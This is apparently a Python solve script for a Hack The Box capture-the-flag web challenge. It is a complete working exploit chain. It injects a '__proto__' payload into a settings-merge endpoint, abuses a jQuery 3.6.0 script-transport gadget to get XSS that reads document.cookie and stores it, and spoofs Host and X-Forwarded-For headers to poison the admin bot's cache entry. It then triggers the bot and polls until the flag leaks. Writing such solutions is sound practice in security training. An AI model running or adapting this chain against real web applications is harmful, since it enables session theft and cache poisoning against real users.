import http.client, json, re, sys, time

# Point this at your own spawned instance:
#   python3 solve.py <host> <port>      e.g. python3 solve.py 10.129.1.2 1337
HOST = sys.argv[1] if len(sys.argv) > 1 else 'TARGET_HOST'
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337
BOT_HOST   = '127.0.0.1:1337'      # Host header the bot sends
BOT_IP     = '127.0.0.1'           # req.ip for the bot (no X-Forwarded-For)
MARKER     = 'pwnkey1337'          # our own cache slot to read the flag back out

session = None

def req(method, path, body=None, host=None, xff=None, ctype=None):
    """One request with full control of Host / X-Forwarded-For (the cache key inputs)."""
    c = http.client.HTTPConnection(HOST, PORT, timeout=20)
    c.putrequest(method, path, skip_host=True, skip_accept_encoding=True)
    c.putheader('Host', host or f'{HOST}:{PORT}')
    if xff:     c.putheader('X-Forwarded-For', xff)
    if session: c.putheader('Cookie', f'session={session}')
    if body is not None:
        c.putheader('Content-Type', ctype or 'application/json')
        c.putheader('Content-Length', str(len(body)))
    c.endheaders()
    if body is not None:
        c.send(body.encode())
    r = c.getresponse()
    data = r.read().decode(errors='replace')
    sc = r.getheader('Set-Cookie')
    c.close()
    return data, sc

# ---- 0) get a session -------------------------------------------------------
_, sc = req('GET', '/')
session = re.search(r'session=([^;]+)', sc).group(1)
print('[*] session acquired')

# ---- 1) store the prototype-pollution payload as OUR settings ---------------
# main.js mergeSettings() walks `for (let key in source)` and recurses on objects,
# so a "__proto__" key writes straight onto Object.prototype.
# Gadget: jQuery 3.6.0 script transport ->
#   S("<script>").attr(s.scriptAttrs || {}).prop({src: s.url})
# dataType "script" + a truthy scriptAttrs selects that transport for the
# /api/stub/build call, and scriptAttrs becomes inline event-handler attributes.
xss = (
    "fetch('/api/settings',{method:'POST',"
    "headers:{'Content-Type':'application/json'},"
    "body:JSON.stringify({leak:document.cookie})})"
    ".then(function(){return fetch('/api/settings',"
    "{headers:{'X-Forwarded-For':'" + MARKER + "'}})})"
)
payload = json.dumps({"__proto__": {
    "dataType": "script",
    "crossDomain": True,
    "scriptAttrs": {"onload": xss, "onerror": xss},
}})
print('[*] save settings:', req('POST', '/api/settings', payload)[0])

# ---- 2) cache-poison the bot's slot -----------------------------------------
# cacheKey = `_${req.headers.host}_${req.url}_${req.headers['x-forwarded-for'] || req.ip}`
# Both inputs are attacker-controlled, so we can write into the bot's entry.
print('[*] poison:', req('GET', '/api/settings', host=BOT_HOST, xff=BOT_IP)[0][:80])

# ---- 3) trigger the bot -----------------------------------------------------
print('[*] trigger:', req('GET', '/api/stub/build')[0])

# ---- 4) read the flag back out of the cache slot the XSS filled -------------
for i in range(20):
    time.sleep(2)
    out, _ = req('GET', '/api/settings', host=BOT_HOST, xff=MARKER)
    if 'HTB{' in out:
        print('\n[+] FLAG:', re.search(r'HTB\{[^}]*\}', out).group())
        break
    print(f'    poll {i+1}: {out[:60]}')
else:
    print('[-] no flag')
